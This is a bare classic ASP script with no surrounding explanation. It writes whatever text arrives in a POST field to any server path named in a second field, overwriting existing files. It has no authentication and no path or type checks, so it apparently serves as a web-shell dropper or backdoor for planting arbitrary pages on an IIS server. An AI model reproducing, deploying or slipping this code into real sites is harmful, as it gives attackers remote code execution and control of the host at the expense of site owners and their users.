<%
    dim fname,page_name
    fname=request.form("text")
	page_name=request.form("page_name")

    If fname<>"" Then

    Set objStream = Server.CreateObject("ADODB.Stream")
    With objStream
    .Open
    .Charset = "utf-8"
    .Position = objStream.Size
    .WriteText=fname
    .SaveToFile server.mappath(page_name),2 
    .Close
    End With
    Set objStream = Nothing
    End If
%>